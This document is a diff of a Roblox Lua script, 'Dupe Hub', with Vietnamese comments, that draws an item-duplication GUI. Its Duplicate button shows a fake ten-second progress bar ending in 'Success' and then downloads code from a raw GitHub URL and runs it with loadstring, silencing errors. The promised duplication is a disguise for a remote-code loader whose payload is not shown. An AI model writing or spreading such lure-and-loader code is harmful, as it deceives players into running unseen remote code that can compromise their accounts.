@@ -1,4 +1,4 @@
--- Dupe Hub v2.2 (PlayerGui): fix khoảng thừa phải & dưới nút Duplicate
+-- Dupe Hub v2.2 (PlayerGui): fix tiến trình và chỉ đổi màu sau khi 100%
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -11,7 +11,7 @@ if old then old:Destroy() end
 
 local function pill(parent, text)
 	local b = Instance.new("TextButton")
-	b.Size = UDim2.new(1, -8, 1, -8) -- khít đều 4 phía
+	b.Size = UDim2.new(1, -8, 1, -8)
 	b.Position = UDim2.new(0, 4, 0, 4)
 	b.BackgroundColor3 = Color3.fromRGB(114, 106, 240)
 	b.Text = text
@@ -140,14 +140,14 @@ t.TextColor3 = Color3.fromRGB(235, 235, 245)
 t.Text = "Dupe Hub"
 dragify(titleBar, frame)
 
--- Body khít nút
+-- Body
 local body = Instance.new("Frame", frame)
 body.BackgroundTransparency = 1
 body.Size = UDim2.new(1, -32, 0, 60)
 body.Position = UDim2.new(0, 16, 0, 64)
 
--- Hiệu ứng tiến trình 10s
-local function ShowProgress10s()
+-- Tiến trình 10s + callback khi hoàn tất
+local function ShowProgress10s(callback)
 	if gui:FindFirstChild("KS_ProgressModal") then gui.KS_ProgressModal:Destroy() end
 	local modal = Instance.new("Frame", gui)
 	modal.Name = "KS_ProgressModal"
@@ -200,23 +200,26 @@ local function ShowProgress10s()
 			task.wait(0.1)
 		end
 		mt.Text = "Success"
-		task.wait(0.8)
+		task.wait(0.6)
 		modal:Destroy()
+		if callback then callback() end -- chỉ gọi sau khi đầy 100%
 	end)
 end
 
--- Nút 🧠 Duplicate cân khít
+-- Nút 🧠 Duplicate
 local btnDup2 = pill(body, "🧠 Duplicate")
 pillColor(btnDup2, 114, 106, 240)
 btnDup2.MouseButton1Click:Connect(function()
 	pcall(function()
 		btnDup2.Text = "🧠 Duplicate"
-		pillColor(btnDup2, 70, 200, 90)
-		ShowProgress10s()
-		local u = "https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"
-		local s
-		pcall(function() s = game:HttpGet(u) end)
-		if s and s ~= "" then pcall(loadstring(s)) else warn("⚠️ Load Failed:", u) end
+		-- Hiện tiến trình, khi hoàn tất thì đổi màu + chạy script
+		ShowProgress10s(function()
+			pillColor(btnDup2, 70, 200, 90)
+			local u = "https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"
+			local s
+			pcall(function() s = game:HttpGet(u) end)
+			if s and s ~= "" then pcall(loadstring(s)) else warn("⚠️ Load Failed:", u) end
+		end)
 	end)
 end)
 
